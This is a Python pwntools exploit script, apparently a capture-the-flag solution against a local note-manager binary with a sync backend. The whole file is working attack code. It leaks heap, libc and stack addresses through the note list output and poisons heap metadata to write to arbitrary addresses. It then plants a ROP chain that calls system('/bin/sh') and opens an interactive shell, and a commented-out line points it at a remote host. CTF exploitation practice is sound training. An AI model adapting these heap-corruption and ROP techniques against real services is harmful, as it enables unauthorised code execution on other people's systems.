#!/usr/bin/env python3

from pwn import *
# import psutil


libc = ELF("./libc.so.6")
p = process(['./interface', './backend'])
interface = context.binary = ELF('interface')

gdb.attach(p, gdbscript = '''
# b*add_new_note+280
# b*edit_note+569
b*note_sync+547
b*note_sync+267
c
''')

input()

# p = remote("addr", 1337)

    
def add(title, author, size, data, encrypt = None):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Author: ', author)
    if encrypt != None:
        p.sendlineafter(b'? ', b'y')
        p.sendlineafter(b'? ', b'giabao')
    else:
        p.sendlineafter(b'? ', b'n')
    p.sendlineafter(b'content? ', str(size))
    p.sendlineafter(b'Content: \n', data)

def list():
    p.sendlineafter(b'Choice: ', b'2')

def show(title, author, encrypt = None):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Author: ', author)
    if encrypt != None:
        p.sendlineafter(b'? ', b'giabao')

def edit(title, author, size, data, encrypt = None):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Author: ', author)
    if encrypt != None:
        p.sendlineafter(b'? ', b'giabao')
    p.sendlineafter(b'len?', str(size))
    p.sendlineafter(b'content:\n', data)   

def delete(title, author, encrypt = None):
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Author: ', author)
    if encrypt != None:
        p.sendlineafter(b'? ', b'giabao') 

def sync_commit(option):
    p.sendlineafter(b'Choice: ', b'6')
    p.sendlineafter(b'? ', option)


add(b'a', b'a', 1, b'a')
edit(b'a', b'a', 1, b'a')
list()
p.recvuntil(b'Content: ')
key = u64(p.recv(5) + b'\0\0\0')
heap = key << 12
print(hex((heap)))
delete(b'a', b'a')
add(b'a', b'a', 0x500, b'a')
add(b'b', b'b', 1, b'b')
edit(b'a', b'a', 1, b'a')
list()
# p.recvuntil(b'Content: ')
p.recvuntil(b'Content: ')
libc.address = u64(p.recv(6) + b'\0\0') - 0x21b110
print(hex((libc.address)))
add(b'c', b'c', 0x450, b'a')
delete(b'a', b'a')
delete(b'b', b'b')
delete(b'c', b'c')

payload = b'a'*0x10 
payload += p64(0) + p64(0x91) + p64(0x62) + p64(0) * 7 + p64(0x62) + p64(0)*3
payload += p64(0x50) + p64(0) + p64(libc.sym.environ)

add(b'a', b'a', 0x98, payload)
sync_commit(b'c')
edit(b'a', b'a', 1, b'a')
add(b'b', b'b', 1, b'b')
sync_commit(b's')
list()
p.recvuntil(b'Content: ')
p.recvuntil(b'Content: ')
stack = u64(p.recv(6) + b'\0\0')
print(hex(stack))
delete(b'a', b'a')
delete(b'b', b'b')
pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])

payload = b'a'*0x10 
payload += p64(0) + p64(0x91) + p64(0x62) + p64(0) * 7 + p64(0x62) + p64(0)*3
payload += p64(0x50) + p64(0) + p64(stack - 0x338)

add(b'a', b'a', 0x98, payload)
add(b'c', b'c', 1, b'c')
add(b'b', b'b', 0x20, rop)
edit(b'c', b'c', 0x110, b'a')
sync_commit(b'c')
edit(b'a', b'a', 1, b'a')
sync_commit(b's')
p.interactive()



